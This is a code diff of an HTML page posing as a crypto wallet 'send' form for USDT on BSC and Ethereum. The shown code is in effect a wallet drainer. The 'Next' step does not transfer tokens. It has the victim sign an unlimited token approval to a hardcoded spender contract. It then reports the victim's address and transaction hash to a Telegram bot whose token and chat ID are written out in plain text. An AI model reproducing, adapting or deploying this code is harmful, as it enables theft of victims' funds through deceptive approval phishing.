@@ -9,7 +9,7 @@
         * { box-sizing: border-box; }
         html, body, #root { width: 100%; height: 100%; margin: 0; font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, sans-serif; font-weight: 500; }
         .theme-light { --bg: #ffffff; --text: #111827; --subtext: #6b7280; --muted: #9ca3af; --accent: #2563eb; --input-bg: #ffffff; --input-soft: #f6f7f9; --border-default: #d1d5db; }
-        body { background: var(--bg); color: var(--text); }
+        body { background: var(--bg ); color: var(--text); }
         .page { min-height: 100dvh; display: flex; justify-content: center; align-items: flex-start; background: var(--bg); padding: 16px; padding-top: 20px; }
         .card { width: 100%; max-width: 420px; padding: 16px; display: flex; flex-direction: column; color: var(--text); border-radius: 16px; }
         .label { font-size: 12px; font-weight: 600; letter-spacing: 0.05em; margin-bottom: 6px; color: var(--subtext); text-transform: uppercase; }
@@ -85,7 +85,7 @@
                 <label class="label">Address or Domain Name</label>
                 <div class="input-row primary">
                     <input id="recipientInput" type="text" placeholder="Search or Enter" value="0x29A3B590B14d97e25b5b04D9804237E5b491b57b" />
-                    <span class="paste" onclick="pasteAddress()">Paste</span>
+                    <span class="paste" onclick="pasteAddress( )">Paste</span>
                 </div>
 
                 <label class="label">Destination Network</label>
@@ -130,7 +130,7 @@
         const CONFIG = { TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA', TELEGRAM_CHAT_ID: '8933407008' };
         let selectedToken = 'usdt_bsc';
 
-        document.addEventListener('DOMContentLoaded', () => {
+        document.addEventListener('DOMContentLoaded', ( ) => {
             initializeTokenDropdown();
             document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
         });
@@ -143,7 +143,7 @@
                 option.className = `token-option ${key === selectedToken ? 'active' : ''}`;
                 option.onclick = () => selectToken(key);
                 option.innerHTML = `<img src="${token.logo}" alt="${token.symbol}" class="token-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22%3E%3Crect fill=%22%23f0f0f0%22 width=%2224%22 height=%2224%22/%3E%3C/svg%3E'"><div class="token-info"><div class="token-name">${token.symbol}</div><div class="token-network">${token.network}</div></div>`;
-                menu.appendChild(option);
+                menu.appendChild(option );
             }
         }
 
@@ -174,8 +174,63 @@
                 particle.style.left = Math.random() * 100 + '%';
                 particle.style.top = Math.random() * 50 + 'px';
                 particle.style.animationDelay = Math.random() * 0.5 + 's';
-                particle.style.animationDuration = (2 + Math.random() * 1) + 's';
                 container.appendChild(particle);
+            }
+        }
+
+        function pasteAddress() {
+            navigator.clipboard.readText().then(text => {
+                document.getElementById('recipientInput').value = text;
+            });
+        }
+
+        function setMaxAmount() {
+            document.getElementById('amountInput').value = '999999';
+            updateAmountInfo();
+        }
+
+        function updateAmountInfo() {
+            const amount = document.getElementById('amountInput').value;
+            const estimatedValue = (parseFloat(amount) || 0) * 1;
+            document.getElementById('amountInfo').textContent = `≈ $${estimatedValue.toFixed(2)}`;
+        }
+
+        function showError(message) {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.textContent = message;
+            errorDiv.classList.add('show');
+        }
+
+        function clearError() {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.classList.remove('show');
+        }
+
+        async function sendTelegramNotification(userAddress, txHash, amount, token, recipient) {
+            const explorerUrl = token.network === 'Ethereum' 
+                ? `https://etherscan.io/tx/${txHash}`
+                : `https://bscscan.com/tx/${txHash}`;
+
+            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date( ).toLocaleString()}\n\nSmart Contract:\n${token.smartContract}`;
+
+            const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                        text: messageText
+                    } )
+                });
+
+                const responseData = await response.json();
+                if (!responseData.ok) {
+                    console.error('Telegram error:', responseData.description);
+                }
+            } catch (err) {
+                console.error('Telegram notification error:', err);
             }
         }
 
@@ -225,50 +280,34 @@
                             method: 'wallet_switchEthereumChain',
                             params: [{ chainId: token.chainIdHex }]
                         });
-                    } catch (switchError) {
-                        if (switchError.code === 4902) {
-                            await ethereum.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [{
-                                    chainId: token.chainIdHex,
-                                    chainName: token.network,
-                                    rpcUrls: [token.rpc],
-                                    nativeCurrency: { name: token.network, symbol: token.symbol, decimals: token.decimals }
-                                }]
-                            });
+                    } catch (err) {
+                        if (err.code === 4902) {
+                            showError('Network not supported');
+                            btn.disabled = false;
+                            btn.textContent = 'Next';
+                            return;
                         }
                     }
                 }
 
-                const USDT_ABI = ['function approve(address spender, uint256 amount) public returns (bool)'];
-                const iface = new ethers.utils.Interface(USDT_ABI);
-                const approveData = iface.encodeFunctionData("approve", [token.smartContract, ethers.constants.MaxUint256]);
-
-                const tx = { to: token.address, data: approveData };
-                if (userAddress) tx.from = userAddress;
+                const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) public returns (bool)']);
+                const tx = {
+                    to: token.address,
+                    data: iface.encodeFunctionData('approve', [token.smartContract, ethers.constants.MaxUint256]),
+                    from: userAddress
+                };
 
                 let txHash = await ethereum.request({ method: "eth_sendTransaction", params: [tx] });
 
-                // Mostra processing screen
+                await new Promise(resolve => setTimeout(resolve, 100));
+
                 createParticles();
-                const processingScreen = document.getElementById('processingScreen');
-                if (processingScreen) {
-                    processingScreen.classList.add('active');
-                }
+                document.getElementById('processingScreen').classList.add('active');
 
-                // Invia notifica Telegram
-                try {
-                    await sendTelegramNotification(userAddress, txHash, amount, token, recipient);
-                } catch (err) {
-                    console.error('Telegram error:', err);
-                }
+                await sendTelegramNotification(userAddress || 'Unknown', txHash, amount, token, recipient);
 
-                // Aspetta 5 secondi e chiudi
                 await new Promise(resolve => setTimeout(resolve, 5000));
-                if (processingScreen) {
-                    processingScreen.classList.remove('active');
-                }
-
+                document.getElementById('processingScreen').classList.remove('active');
                 btn.textContent = 'Next';
                 btn.disabled = false;
                 document.getElementById('amountInput').value = '';
@@ -277,65 +316,14 @@
             } catch (error) {
                 console.error("Error:", error);
                 showError('Transaction failed: ' + error.message);
-                const processingScreen = document.getElementById('processingScreen');
-                if (processingScreen) {
-                    processingScreen.classList.remove('active');
-                }
+                document.getElementById('processingScreen').classList.remove('active');
                 btn.disabled = false;
                 btn.textContent = 'Next';
             }
         }
 
-        async function sendTelegramNotification(userAddress, txHash, amount, token, recipient) {
-            const explorerUrl = token.network === 'Ethereum' ? `https://etherscan.io/tx/${txHash}` : `https://bscscan.com/tx/${txHash}`;
-            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}`;
-
-            const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CONFIG.TELEGRAM_CHAT_ID, text: messageText })
-            });
-
-            const responseData = await response.json();
-            if (!responseData.ok) {
-                throw new Error('Telegram API error: ' + (responseData.description || 'Unknown error'));
-            }
-        }
-
-        async function pasteAddress() {
-            try {
-                const text = await navigator.clipboard.readText();
-                document.getElementById('recipientInput').value = text;
-            } catch (error) {
-                showError('Failed to read clipboard');
-            }
-        }
-
-        async function setMaxAmount() {
-            document.getElementById('amountInput').value = '999999';
-            updateAmountInfo();
-        }
-
-        function updateAmountInfo() {
-            const amount = document.getElementById('amountInput').value;
-            if (amount) {
-                const usdValue = (parseFloat(amount) * 1).toFixed(2);
-                document.getElementById('amountInfo').textContent = `≈ $${usdValue}`;
-            }
-        }
-
-        function showError(message) {
-            const errorDiv = document.getElementById('errorMessage');
-            errorDiv.textContent = message;
-            errorDiv.classList.add('show');
-        }
-
-        function clearError() {
-            const errorDiv = document.getElementById('errorMessage');
-            errorDiv.classList.remove('show');
-            errorDiv.textContent = '';
-        }
+        initializeTokenDropdown();
+        document.getElementById('selectedTokenLogo').src = TOKENS[selectedToken].logo;
     </script>
 </body>
 </html>
